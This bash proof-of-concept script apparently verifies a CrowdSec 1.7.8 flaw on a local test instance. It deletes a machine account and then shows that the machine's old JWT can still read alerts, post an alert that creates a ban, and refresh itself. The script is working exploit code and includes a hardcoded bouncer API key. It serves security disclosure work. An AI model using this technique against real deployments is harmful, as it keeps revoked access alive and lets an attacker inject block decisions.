#!/bin/bash
# H7 replay against the OFFICIAL RELEASE instance (CrowdSec v1.7.8 release binaries).
# Mirrors the H7 section of poc/remaining2.sh / poc/demo-h7.sh using the release cscli.
set -u
cd "$(dirname "$0")/../../poc"
BL=http://127.0.0.1:18080
BKEY='xw20tUFOu3EZ0w0RYM5Orteoytg1emnJ5+Y/IN0oy0U'
UA='crowdsec/v1.7.8-63227459-linux'
NOW=$(date -u +%Y-%m-%dT%H:%M:%SZ)
OUT=../supplement-release/h7-release-results.txt
: > "$OUT"
log() { echo "$@" | tee -a "$OUT"; }
code() { curl -s --noproxy '*' -m 25 -o /tmp/r7rel.json -w '%{http_code}' "$@"; }
body() { head -c 400 /tmp/r7rel.json | tr '\n' ' '; echo; }
alert_nodsc() {
cat <<JSON
[{"message":"h7-rel nodsc","events_count":1,"start_at":"$NOW","stop_at":"$NOW","capacity":10,"leakspeed":"10s","scenario":"test/manual","scenario_version":"1.0","scenario_hash":"x","remediation":true,"simulated":false,"source":{"scope":"Ip","value":"$1"},"events":[{"timestamp":"$NOW","meta":[{"key":"source_ip","value":"$1"}]}]}]
JSON
}

log "===== H7 REPLAY on official release binaries ====="
./bin-rel/crowdsec --version 2>&1 | head -2 | tee -a "$OUT"
./bin-rel/cscli version 2>&1 | head -1 | tee -a "$OUT"
log "-- vulnerable code (release tag source, pkg/apiserver/middlewares/v1/jwt.go:240-242):"
sed -n '240,242p' ~/workspace/tmp/crowdsec-rel/relsrc/crowdsec-1.7.8/pkg/apiserver/middlewares/v1/jwt.go | tee -a "$OUT"
log "-- cscli machines add agentC (release cscli):"
timeout 60 ./bin-rel/cscli -c instance-rel/config.yaml machines add agentC -p 'AgentC-pass-123!' -f /tmp/agentC-rel-creds.yaml 2>&1 | tail -2 | tee -a "$OUT"
log "-- login agentC:"
c=$(code -X POST "$BL/v1/watchers/login" -H 'Content-Type: application/json' -H "User-Agent: $UA" -d '{"machine_id":"agentC","password":"AgentC-pass-123!"}'); log "HTTP $c"
TOKC=$(python3 -c "import json; print(json.load(open('/tmp/r7rel.json'))['token'])" 2>/dev/null)
log "   token captured: ${TOKC:0:25}..."
log "-- control: TOKC GET /v1/heartbeat (expect 200):"
c=$(code "$BL/v1/heartbeat" -H "Authorization: Bearer $TOKC" -H "User-Agent: $UA"); log "HTTP $c"; body | tee -a "$OUT"
log "-- cscli machines delete agentC (release cscli):"
timeout 60 ./bin-rel/cscli -c instance-rel/config.yaml machines delete agentC 2>&1 | tail -2 | tee -a "$OUT"
python3 -c "
import sqlite3; db=sqlite3.connect('instance-rel/data/crowdsec.db')
print('  agentC rows left:', db.execute(\"SELECT count(*) FROM machines WHERE machine_id='agentC'\").fetchone()[0])" | tee -a "$OUT"
log "-- control: fresh login as agentC after deletion (expect refusal):"
c=$(code -X POST "$BL/v1/watchers/login" -H 'Content-Type: application/json' -H "User-Agent: $UA" -d '{"machine_id":"agentC","password":"AgentC-pass-123!"}'); log "HTTP $c"; body | tee -a "$OUT"
log "-- POST-DELETION: TOKC GET /v1/alerts:"
c=$(code "$BL/v1/alerts" -H "Authorization: Bearer $TOKC" -H "User-Agent: $UA"); log "HTTP $c"; body | tee -a "$OUT"
log "-- POST-DELETION: TOKC POST /v1/alerts (nodsc 192.0.2.203, write attempt):"
c=$(code -X POST "$BL/v1/alerts" -H "Authorization: Bearer $TOKC" -H 'Content-Type: application/json' -d "$(alert_nodsc 192.0.2.203)"); log "HTTP $c"; body | tee -a "$OUT"
log "-- bouncer view of 192.0.2.203 (deleted machine's decision live?):"
curl -s --noproxy '*' "$BL/v1/decisions?value=192.0.2.203" -H "X-Api-Key: $BKEY" | tee -a "$OUT"; echo | tee -a "$OUT"
log "-- POST-DELETION: TOKC GET /v1/refresh_token:"
c=$(code "$BL/v1/refresh_token" -H "Authorization: Bearer $TOKC" -H "User-Agent: $UA"); log "HTTP $c"; head -c 160 /tmp/r7rel.json | tee -a "$OUT"; echo | tee -a "$OUT"
log "===== END H7 release replay ====="
